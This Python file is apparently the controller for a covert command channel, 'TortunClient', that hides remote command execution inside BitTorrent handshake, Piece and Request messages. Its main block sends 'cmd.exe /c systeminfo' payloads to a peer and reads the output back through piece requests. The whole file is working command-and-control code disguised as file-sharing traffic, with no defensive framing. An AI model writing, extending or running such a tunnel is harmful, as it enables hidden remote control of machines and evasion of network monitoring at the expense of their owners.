import socket
import hashlib
from bittorrent_protocol.client import BitTorrentClient
from bittorrent_protocol.consts import PROTOCOL_DESCRIPTION
from bittorrent_protocol.message import *
import payload


class TortunClient(BitTorrentClient):
    def __init__(self, info_hash):
        super(TortunClient, self).__init__(socket.socket(), info_hash)
        self.block_size = 16384
        self.output_offset = 0
        self.wanted_piece = 12

        self.pending_commands = []

    def _validate_handshake(self, result):
        if result["proto"] != PROTOCOL_DESCRIPTION:
            return False
        elif result["info_hash"] != self.info_hash:
            return False
        else:
            return True

    def connect(self, address):
        print(f"Connecting to remote instance on {address}")
        self.sock.connect(address)
        self.send_handshake()
        handshake_result = self.read_handshake()
        self._validate_handshake(handshake_result)
        remote_peer_id = handshake_result["peer_id"]
        print(f"Connected to remote peer {remote_peer_id}")

    def send_sequence(self, payload):
        new_message = self.read_message()
        if isinstance(new_message, Request):
            self.sock.send(Piece(new_message.piece_index, new_message.block_offset, payload).create_buffer())

    def request_output(self):
        self.sock.send(Request(12, self.output_offset, self.block_size).create_buffer())
        self.output_offset += self.block_size

    def receive_sequence(self):
        self.wanted_piece += 1
        self.output_offset = 0
        self.request_output()
        output = b''
        while True:
            new_message = self.read_message()
            if isinstance(new_message, Piece):
                chunk = payload.RazorPayload.read_output(new_message.data)
                output += chunk
                if len(chunk) < self.block_size - 8:
                    break
            else:
                break
        return output

    def bitfield_handshake(self):
        self.send_bitfield()
        print(self.read_message())


if __name__ == '__main__':
    h = hashlib.sha1()
    h.update(b"tomer")
    t = TortunClient(h.digest())
    t.connect(("127.0.0.1", 6888))
    t.bitfield_handshake()
    t.unchoke()
    p = payload.RunCommand("cmd.exe", "/c systeminfo").to_razor_payload()
    t.send_sequence(p)
    t.choke()
    t.send_keepalive()
    junk = t.read_message()
    cmd_out = t.receive_sequence()
    print(cmd_out.decode('utf-8'))
    t.unchoke()
    p = payload.RunCommand("cmd.exe", "/c systeminfo").to_razor_payload()
    t.send_sequence(p)
    t.choke()
    t.send_keepalive()
    junk = t.read_message()
    cmd_out = t.receive_sequence()
    print(cmd_out.decode('utf-8'))
